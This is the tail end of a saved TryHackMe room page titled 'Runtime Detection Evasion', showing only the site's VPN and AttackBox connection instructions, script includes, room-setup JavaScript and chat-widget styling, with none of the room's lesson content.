<div class="unstuck-icon"><i class="fas fa-users"></i></div>
<div class="unstuck-icon-text">Ask Community</div>
</a>
</div>
</div>
</div>
</div>
</div>
<style>

    #navConnModal .modal-body{
        position: relative;
    }

    #nav-openvpn,
    #nav-attackbox {
        display: none;
    }

    #nav-openvpn .nav-pills .nav-link.active,
    #nav-openvpn .nav-pills .show>.nav-link {
        background-color: #ec8e3d;
        color: white;
    }
    #nav-openvpn .nav-link {
        color: #909090;
    }
    #nav-openvpn a,
    #nav-attackbox a {
        color: #ec8e3d;
    }

    #nav-openvpn code.dark {
        background-color: #7d400a;
        color: #fff;
    }

    #slideout-bk {
        display: none;
        padding: 10px 15px;
        opacity: 0.8;
        cursor: pointer;
    }

    #slideout-bk:hover {
        opacity: 1;
    }

    #slideout-conn-hideip {
        display: none;
        position: absolute;
        bottom: 8px;
        right: 8px;
        opacity: 0.7;
        cursor: pointer;
    }

    #slideout-conn-hideip:hover {
        opacity: 1;
    }

</style>
<div class="modal fade slideout-faq" id="navConnModal" tabindex="-1" role="dialog">
<div class="modal-dialog modal-dialog-slideout" role="document">
<div class="modal-content">
<div class="modal-body">
<div id="slideout-bk" class="noselect" onclick="showSlideoutConnOptions()"><i class="far fa-arrow-left mr-2"></i> Show Connection Options</div>
<div id="slideout-conn-options">
<div id="slideout-conn-header" class="text-center">
<img class="slideout-connect-img" src="./TryHackMe _ Runtime Detection Evasion_files/tryhackme_connect.png">
<div id="slideout-conn-status" class="size-22">You are <span class="text-danger">disconnected</span></div>
</div>
<div class="m-3 text-center">
<p>To access target machines you need to either:</p>
<div class="row mb-3 faq-quicklinks text-left vertical-align-custom">
<div class="col-md-12 mb-3">
<a class="clear-link preventDefault" href="https://tryhackme.com/room/runtimedetectionevasion#" onclick="showAttackBoxSteps()">
<div class="card card-body">
<div class="row vertical-align-custom">
<div class="col col-2 text-center faq-quicklinks-icons">
<i class="far fa-laptop"></i>
</div>
<div class="col">
<div class="faq-quicklinks-title size-18">AttackBox</div>
<p class="faded mb-0">Use a browser-based attack machine</p>
</div>
</div>
</div>
</a>
</div>
<div class="col-md-12">
<a class="clear-link preventDefault" href="https://tryhackme.com/room/runtimedetectionevasion#" onclick="showVPNSteps()">
<div class="card card-body">
<div class="row vertical-align-custom">
<div class="col col-2 text-center faq-quicklinks-icons">
<i class="far fa-key"></i>
</div>
<div class="col">
<div class="faq-quicklinks-title size-18">OpenVPN</div>
<p class="faded mb-0">Connect to our network via a VPN</p>
</div>
</div>
</div>
</a>
</div>
</div>
</div>
</div>
<div id="faqCards" class="p-3">
<div id="nav-openvpn">
<div class="mb-3">
<a target="_blank" href="https://tryhackme.com/access"><i>View the dedicated OpenVPN access page for more information</i></a>
</div>
<div class="text-center">
<h4>What Operating System are you using?</h4>
<ul class="nav nav-pills mb-3 text-center" id="vpn-guide" style="display: flex; justify-content: center;">
<li class="nav-item m-3">
<a class="nav-link" data-toggle="pill" href="https://tryhackme.com/room/runtimedetectionevasion#pills-windows" role="tab" aria-controls="pills-windows" aria-selected="true"><i class="fab fa-windows mr-2"></i> Windows</a>
</li>
<li class="nav-item m-3">
<a class="nav-link active" data-toggle="pill" href="https://tryhackme.com/room/runtimedetectionevasion#pills-linux" role="tab" aria-controls="pills-linux" aria-selected="false"><i class="fab fa-linux mr-2"></i> Linux</a>
</li>
<li class="nav-item m-3">
<a class="nav-link" data-toggle="pill" href="https://tryhackme.com/room/runtimedetectionevasion#pills-macos" role="tab" aria-controls="pills-macos" aria-selected="false"><i class="fab fa-apple mr-2"></i> MacOS</a>
</li>
</ul>
<div class="tab-content text-left">
<div class="tab-pane fade" id="pills-windows" role="tabpanel">
<ol>
<li><a href="https://tryhackme.com/vpn/get-config">Download</a> your OpenVPN configuration pack.</li>
<li class="mt-2"><a target="_blank" href="https://openvpn.net/client-connect-vpn-for-windows/">Download</a> the OpenVPN GUI application.</li>
<li class="mt-2">Install the OpenVPN GUI application. Then open the installer file and follow the setup wizard.</li>
<li class="mt-2">Open and run the OpenVPN GUI application as Administrator.<br><img class="mt-2 mb-3" src="./TryHackMe _ Runtime Detection Evasion_files/win_ran_admin.png"></li>
<li class="mt-2">The application will start running in the system tray. It's at the bottom of your screen, near the clock. Right click on the application and click <b>Import File</b>. <br><img class="mt-2 mb-3" src="./TryHackMe _ Runtime Detection Evasion_files/win_import.png"></li>
<li class="mt-2">Select the configuration file you downloaded earlier.</li>
<li class="mt-2">Now right click on the application again, select your file and click Connect <br><img class="mt-2 mb-3" src="./TryHackMe _ Runtime Detection Evasion_files/win_connect.png"></li>
</ol>
</div>
<div class="tab-pane fade show active" id="pills-linux" role="tabpanel">
<ol>
<li><a href="https://tryhackme.com/vpn/get-config">Download</a> your OpenVPN configuration pack.</li>
<li class="mt-2">Run the following command in your terminal: <code class="dark">sudo apt install openvpn</code></li>
<li class="mt-2">Locate the full path to your VPN configuration file (normally in your ~/Downloads folder).</li>
<li class="mt-2">Use your OpenVPN file with the following command: <code class="dark">sudo openvpn /path/to/file.ovpn</code></li>
</ol>
</div>
<div class="tab-pane fade" id="pills-macos" role="tabpanel">
<ol>
<li><a href="https://tryhackme.com/vpn/get-config">Download</a> your OpenVPN configuration pack.</li>
<li class="mt-2"><a href="https://openvpn.net/downloads/openvpn-connect-v2-macos.dmg">Download</a> OpenVPN for MacOS.</li>
<li class="mt-2">Install the OpenVPN GUI application, by opening the dmg file and following the setup wizard.<br><img width="250" class="mt-2 mb-3" src="./TryHackMe _ Runtime Detection Evasion_files/mac_installer.png"></li>
<li class="mt-2">Open and run the OpenVPN GUI application.</li>
<li class="mt-2">The application will start running and appear in your top bar. Right click on the application and click <b>Import File -&gt; Local file</b>.<br><img class="mt-2 mb-3" src="./TryHackMe _ Runtime Detection Evasion_files/mac_import.png"></li>
<li class="mt-2">Select the configuration file you downloaded earlier.</li>
<li class="mt-2">Right click on the application again, select your file and click connect.<br><img class="mt-2 mb-3" src="./TryHackMe _ Runtime Detection Evasion_files/mac_connect.png"></li>
</ol>
</div>
</div>
<section class="text-left">
<a class="remove-underline" data-toggle="collapse" href="https://tryhackme.com/room/runtimedetectionevasion#havingProblems" role="button" aria-expanded="false" aria-controls="havingProblems">
<h5 class="mb-0 text-openvpn">Having Problems?</h5>
</a>
<div class="collapse" id="havingProblems">
<ul class="mt-2 mb-0">
<li>If you can access <a target="_blank" href="http://10.10.10.10/">10.10.10.10</a>, you're connected.</li>
<li>Downloading and getting a 404? Go the <a href="https://tryhackme.com/access">access</a> page and switch VPN servers.</li>
<li>Getting inline cert error? Go the <a href="https://tryhackme.com/access">access</a> page and switch VPN servers.</li>
<li>If you are using a virtual machine, you will need to run the VPN inside that machine.</li>
<li>Is the OpenVPN client running as root? <span class="size-14 faded">(On Windows, run OpenVPN GUI as administrator. On Linux, run with sudo)</span></li>
<li>Have you restarted your VM?</li>
<li>Is your OpenVPN up-to-date?</li>
<li>Only 1 OpenVPN connection is allowed. <span class="size-14 faded">(Run <code class="dark">ps aux | grep openvpn</code> - are there 2 VPN sessions running?)</span></li>
<li>Still having issues? Check our <a href="https://help.tryhackme.com/en/articles/6496029-openvpn-general-troubleshooting-detailed/">docs</a> out.</li>
</ul>
</div>
</section>
</div>
</div>
<div id="nav-attackbox">
<div class="text-center">
<h4>AttackBox</h4>
<p class="faded">Use your own web-based linux machine to access machines on TryHackMe</p>
</div>
<p>To start your AttackBox in the room, click the <a class="preventDefault" onclick="showAttackBoxBtnFromSlideout()" href="https://tryhackme.com/room/runtimedetectionevasion#">Start AttackBox</a> button. Your private machine will take 2 minutes to start.</p>
<p>Free users get 1 free AttackBox hour. <a class="hacker-green" href="https://tryhackme.com/why-subscribe">Subscribed</a> users get more powerful machines with unlimited deploys.</p>
</div>
</div>
<span id="slideout-conn-hideip" onclick="hideNavConnIP()" style="display: none;">Hide IP</span>
</div>
</div>
</div>
</div>
<script>

    const navConnVPNEl = document.querySelector('#nav-openvpn')
    const navConnAttackBoxEl = document.querySelector('#nav-attackbox')
    const navConnOptions = document.querySelector('#slideout-conn-options')

    const navConnBkBtn = document.querySelector('#slideout-bk')

    function showVPNSteps() {
        navConnOptions.style.display = 'none'
        navConnVPNEl.style.display = 'block'
        navConnBkBtn.style.display = 'block'
    }

    function showAttackBoxSteps() {
        navConnOptions.style.display = 'none'
        navConnAttackBoxEl.style.display = 'block'
        navConnBkBtn.style.display = 'block'
    }

    function showSlideoutConnOptions() {
        navConnVPNEl.style.display = 'none'
        navConnAttackBoxEl.style.display = 'none'
        navConnBkBtn.style.display = 'none'
        navConnOptions.style.display = 'block'
    }

    function showAttackBoxBtnFromSlideout() {
        $('#navConnModal').modal('toggle')
        setTimeout(function() {
            showAttackBoxBtnIntro()
        }, 100)   
    }

  </script>
</div>
<script src="./TryHackMe _ Runtime Detection Evasion_files/notify.js"></script>
<script src="./TryHackMe _ Runtime Detection Evasion_files/api-requests.js"></script>
<script src="./TryHackMe _ Runtime Detection Evasion_files/events.js"></script>
<script src="./TryHackMe _ Runtime Detection Evasion_files/underscore-min.js"></script>
<script src="./TryHackMe _ Runtime Detection Evasion_files/apexcharts.min.js"></script> 
<script src="./TryHackMe _ Runtime Detection Evasion_files/chart.js"></script>
<script src="./TryHackMe _ Runtime Detection Evasion_files/expire.js"></script>
<script src="./TryHackMe _ Runtime Detection Evasion_files/sockets.js"></script>
<script src="./TryHackMe _ Runtime Detection Evasion_files/faqSearch.js"></script>
<script src="./TryHackMe _ Runtime Detection Evasion_files/certificate.js"></script>
<script src="./TryHackMe _ Runtime Detection Evasion_files/utils.js"></script>
<script src="./TryHackMe _ Runtime Detection Evasion_files/roomSpecific.js"></script>
<script src="./TryHackMe _ Runtime Detection Evasion_files/confetti.js"></script>
<script src="./TryHackMe _ Runtime Detection Evasion_files/videos.js"></script>
<script src="./TryHackMe _ Runtime Detection Evasion_files/intro.js"></script>
<script src="./TryHackMe _ Runtime Detection Evasion_files/prism.js"></script>
<script src="./TryHackMe _ Runtime Detection Evasion_files/asciinema-player.js"></script>
<iframe id="_hjSafeContext_7774374" title="_hjSafeContext" tabindex="-1" aria-hidden="true" src="./TryHackMe _ Runtime Detection Evasion_files/saved_resource.html" style="display: none !important; width: 1px !important; height: 1px !important; opacity: 0 !important; pointer-events: none !important;"></iframe><script src="./TryHackMe _ Runtime Detection Evasion_files/magnific-popup.min.js"></script>
<script src="./TryHackMe _ Runtime Detection Evasion_files/introjsLogic.js"></script>
<script src="./TryHackMe _ Runtime Detection Evasion_files/logic.js"></script>
<script src="./TryHackMe _ Runtime Detection Evasion_files/tasks.js"></script>
<script src="./TryHackMe _ Runtime Detection Evasion_files/connection-status.js"></script>
<script src="./TryHackMe _ Runtime Detection Evasion_files/glossary.js"></script>
<script src="./TryHackMe _ Runtime Detection Evasion_files/room-mymachine.js"></script>
<script src="./TryHackMe _ Runtime Detection Evasion_files/heartbeat.js" defer=""></script>
<script>

    let height
    $(window).scroll(function () { /* Function to make IP information sticky. */
      if (height == undefined || height < 30) {
        height = ($('#instance-info').offset().top)
      }
      let scroll = $(window).scrollTop()
      if (((scroll >= (height + 150))) && height > 30) {
        $("#instance-info").addClass('instance-sticky')
      } else if ((scroll <= (height))) {
        $("#instance-info").removeClass("instance-sticky")
      }
    })

    const csrfToken = "XnGmCUDv-rVJSc2Z0RIzAc1yAJX6JRV4NwV0"
    $.ajaxSetup({ headers: { 'CSRF-Token': csrfToken } }) // all $.post headers include token (needs csrfProtection middleware)

    const roomCode = "runtimedetectionevasion"
    const simpleRoom = true 
    const events = {"tickets":false}

    let userObj = { 
      subscribed: 1,
      splitScreen: false,
      path: "redteaming",
      tutorial: {
        rooms: true,
        attackbox: true,
        staticsite: true
      },
      experiments:  JSON.parse(`{"onboardingAchievement":{},"scheduler":{"startDate":"2023-06-14T13:38:51.108Z"},"showEasyPath":true}`),
    }

    const roomSettings = {
      remAttackBoxBtn : false
    };

    const heartbeatInterval = 30;

    const cloudEnabled = false 
    let cloudObj

    initRoom()
    checkVideoTab()
    if(!simpleRoom) showChart(roomCode)

    checkRoomAwards(roomCode)

    getRoomVotes()

    displayStreakFreezeAwardedFromMemory();
    
    window.addEventListener('load', function () {
      introjsInit(roomCode)
    })

  </script>


<svg id="SvgjsSvg1001" width="2" height="0" xmlns="http://www.w3.org/2000/svg" version="1.1" xmlns:xlink="http://www.w3.org/1999/xlink" xmlns:svgjs="http://svgjs.dev" style="overflow: hidden; top: -100%; left: -100%; position: absolute; opacity: 0;"><defs id="SvgjsDefs1002"></defs><polyline id="SvgjsPolyline1003" points="0,0"></polyline><path id="SvgjsPath1004" d="M0 0 "></path></svg><div id="2B73FB1C-331B-2ECD-3009-FC991ACA539F"></div><iframe id="intercom-frame" style="position: absolute !important; opacity: 0 !important; width: 1px !important; height: 1px !important; top: 0 !important; left: 0 !important; border: none !important; display: block !important; z-index: -1 !important; pointer-events: none;" aria-hidden="true" tabindex="-1" title="Intercom" src="./TryHackMe _ Runtime Detection Evasion_files/saved_resource(1).html"></iframe><div class="intercom-lightweight-app"><div class="intercom-lightweight-app-launcher intercom-launcher" role="button" tabindex="0" aria-label="Open Intercom Messenger" aria-live="polite"><div class="intercom-lightweight-app-launcher-icon intercom-lightweight-app-launcher-icon-open"><img src="./TryHackMe _ Runtime Detection Evasion_files/9e0f012f15b6fc981dde2f1f5198d728.png" alt="" class="intercom-lightweight-app-launcher-custom-icon-open"></div><div class="intercom-lightweight-app-launcher-icon intercom-lightweight-app-launcher-icon-minimize"><svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
  <path fill-rule="evenodd" clip-rule="evenodd" d="M18.601 8.39897C18.269 8.06702 17.7309 8.06702 17.3989 8.39897L12 13.7979L6.60099 8.39897C6.26904 8.06702 5.73086 8.06702 5.39891 8.39897C5.06696 8.73091 5.06696 9.2691 5.39891 9.60105L11.3989 15.601C11.7309 15.933 12.269 15.933 12.601 15.601L18.601 9.60105C18.9329 9.2691 18.9329 8.73091 18.601 8.39897Z" fill="white"></path>
</svg>
</div></div><style id="intercom-lightweight-app-style" type="text/css">
  @keyframes intercom-lightweight-app-launcher {
    from {
      opacity: 0;
      transform: scale(0.5);
    }
    to {
      opacity: 1;
      transform: scale(1);
    }
  }

  @keyframes intercom-lightweight-app-gradient {
    from {
      opacity: 0;
    }
    to {
      opacity: 1;
    }
  }

  @keyframes intercom-lightweight-app-messenger {
    0% {
      opacity: 0;
      transform: scale(0);
    }
    40% {
      opacity: 1;
    }
    100% {
      transform: scale(1);
    }
  }

  .intercom-lightweight-app {
    position: fixed;
    z-index: 2147483001;
    width: 0;
    height: 0;
    font-family: intercom-font, "Helvetica Neue", "Apple Color Emoji", Helvetica, Arial, sans-serif;
  }

  .intercom-lightweight-app-gradient {
    position: fixed;
    z-index: 2147483002;
    width: 500px;
    height: 500px;
    bottom: 0;
    right: 0;
    pointer-events: none;
    background: radial-gradient(
      ellipse at bottom right,
      rgba(29, 39, 54, 0.16) 0%,
      rgba(29, 39, 54, 0) 72%);
    animation: intercom-lightweight-app-gradient 200ms ease-out;
  }

  .intercom-lightweight-app-launcher {
    position: fixed;
    z-index: 2147483003;
    padding: 0 !important;
    margin: 0 !important;
    border: none;
    bottom: 20px;
    right: 20px;
    max-width: 48px;
    width: 48px;
    max-height: 48px;
    height: 48px;
    border-radius: 50%;
    background: #1C2538;
    cursor: pointer;
    box-shadow: 0 1px 6px 0 rgba(0, 0, 0, 0.06), 0 2px 32px 0 rgba(0, 0, 0, 0.16);
    transition: transform 167ms cubic-bezier(0.33, 0.00, 0.00, 1.00);
    box-sizing: content-box;
  }


  .intercom-lightweight-app-launcher:hover {
    transition: transform 250ms cubic-bezier(0.33, 0.00, 0.00, 1.00);
    transform: scale(1.1)
  }

  .intercom-lightweight-app-launcher:active {
    transform: scale(0.85);
    transition: transform 134ms cubic-bezier(0.45, 0, 0.2, 1);
  }


  .intercom-lightweight-app-launcher:focus {
    outline: none;

    
  }

  .intercom-lightweight-app-launcher-icon {
    display: flex;
    align-items: center;
    justify-content: center;
    position: absolute;
    top: 0;
    left: 0;
    width: 48px;
    height: 48px;
    transition: transform 100ms linear, opacity 80ms linear;
  }

  .intercom-lightweight-app-launcher-icon-open {
    
        opacity: 1;
        transform: rotate(0deg) scale(1);
      
  }

  .intercom-lightweight-app-launcher-icon-open svg {
    width: 24px;
    height: 24px;
  }

  .intercom-lightweight-app-launcher-icon-open svg path {
    fill: rgb(255, 255, 255);
  }

  .intercom-lightweight-app-launcher-icon-self-serve {
    
        opacity: 1;
        transform: rotate(0deg) scale(1);
      
  }

  .intercom-lightweight-app-launcher-icon-self-serve svg {
    height: 44px;
  }

  .intercom-lightweight-app-launcher-icon-self-serve svg path {
    fill: rgb(255, 255, 255);
  }

  .intercom-lightweight-app-launcher-custom-icon-open {
    max-height: 24px;
    max-width: 24px;

    
        opacity: 1;
        transform: rotate(0deg) scale(1);
      
  }

  .intercom-lightweight-app-launcher-icon-minimize {
    
        opacity: 0;
        transform: rotate(-60deg) scale(0);
      
  }

  .intercom-lightweight-app-launcher-icon-minimize svg path {
    fill: rgb(255, 255, 255);
  }

  .intercom-lightweight-app-messenger {
    position: fixed;
    z-index: 2147483003;
    overflow: hidden;
    background-color: white;
    animation: intercom-lightweight-app-messenger 250ms cubic-bezier(0, 1, 1, 1);
    transform-origin: bottom right;
    
        width: 400px;
        height: calc(100% - 104px);
        max-height: 704px;
        min-height: 250px;
        right: 20px;
        bottom: 84px;
        box-shadow: 0 5px 40px rgba(0,0,0,0.16);
      

    border-radius: 16px;
  }

  .intercom-lightweight-app-messenger-header {
    height: 64px;
    border-bottom: none;
    background: #1c2538

    
  }

  .intercom-lightweight-app-messenger-footer{
    position:absolute;
    bottom:0;
    width: 100%;
    height: 80px;
    background: #fff;
    font-size: 14px;
    line-height: 21px;
    border-top: 1px solid rgba(0, 0, 0, 0.05);
    box-shadow: 0px 0px 25px rgba(0, 0, 0, 0.05);
    
  }

  @media print {
    .intercom-lightweight-app {
      display: none;
    }
  }
</style></div></body></html>